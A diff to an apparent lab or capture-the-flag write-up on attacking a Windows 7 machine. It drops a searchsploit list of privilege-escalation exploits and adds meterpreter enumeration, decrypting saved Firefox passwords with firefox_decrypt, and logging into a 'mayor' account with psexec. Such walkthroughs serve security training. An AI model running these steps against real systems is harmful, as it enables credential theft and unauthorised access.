@@ -560,36 +560,12 @@ Trying wizardopium for [CVE-2019-1458](https://www.exploit-db.com/exploits/48180
     [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
     [*] Exploit completed, but no session was created.
 
-O dear. Back to the drawing board.
+O dear. Back to the drawing board. Ah.
 
 ```text
-msf6 exploit(windows/local/cve_2019_1458_wizardopium) > searchsploit windows 7 x64 escalation
-[*] exec: searchsploit windows 7 x64 escalation
-
--------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                  |  Path
--------------------------------------------------------------------------------- ---------------------------------
-Fortinet FortiClient 5.2.3 (Windows 10 x64 Creators) - Local Privilege Escalati | windows_x86-64/local/45149.cpp
-Fortinet FortiClient 5.2.3 (Windows 10 x64 Post-Anniversary) - Local Privilege  | windows_x86-64/local/41722.c
-Fortinet FortiClient 5.2.3 (Windows 10 x64 Pre-Anniversary) - Local Privilege E | windows_x86-64/local/41721.c
-IKARUS anti.virus 2.16.7 - 'ntguard_x64' Local Privilege Escalation             | windows_x86-64/local/43139.c
-Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Co | windows_x86-64/local/47170.c
-Microsoft Windows (x86/x64) - 'Error Reporting' Discretionary Access Control Li | windows/local/46917.txt
-Microsoft Windows 10 (19H1 1901 x64) - 'ws2ifsl.sys' Use After Free Local Privi | windows_x86-64/local/47935.cpp
-Microsoft Windows 7 (x64) - 'afd.sys' Dangling Pointer Privilege Escalation (MS | windows_x86-64/local/39525.py
-Microsoft Windows 7 (x86/x64) - Group Policy Privilege Escalation (MS16-072)    | windows/local/40219.txt
-Microsoft Windows 7 < 10 / 2008 < 2012 (x86/x64) - Local Privilege Escalation ( | windows/local/39809.cs
-Microsoft Windows 7 < 10 / 2008 < 2012 (x86/x64) - Secondary Logon Handle Privi | windows/local/40107.rb
-Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalatio | windows/local/39719.ps1
-Microsoft Windows 8.0/8.1 (x64) - 'TrackPopupMenu' Local Privilege Escalation ( | windows_x86-64/local/37064.py
-Microsoft Windows 8.1 (x86/x64) - 'ahcache.sys' NtApphelpCacheControl Privilege | windows/local/35661.txt
-Microsoft Windows 8.1 Update 2 / 10 10586 (x86/x64) - NtLoadKeyEx User Hive Att | windows/local/40429.cs
-Microsoft Windows < 8.1 (x86/x64) - User Profile Service Privilege Escalation ( | windows/local/35811.txt
-NoMachine < 6.0.80 (x64) - 'nxfuse' Privilege Escalation                        | windows_x86-64/local/44168.py
-Oracle VM VirtualBox 5.0.32 r112930 (x64) - Windows Process COM Injection Privi | windows_x86-64/local/41908.txt
-PCAUSA Rawether (ASUS PCE-AC56 WLAN Card Utilities Windows 10 x64) - Local Priv | windows_x86-64/local/41605.txt
--------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-Papers: No Results
-msf6 exploit(windows/local/cve_2019_1458_wizardopium) > 
+meterpreter > run post/windows/gather/enum_applications
+meterpreter > run post/windows/gather/enum_applications
 ```
+
+Then use the [Firefox Decrypt tool from Github](https://github.com/unode/firefox_decrypt), and log in to the "mayor" 
+account using `psexec`.
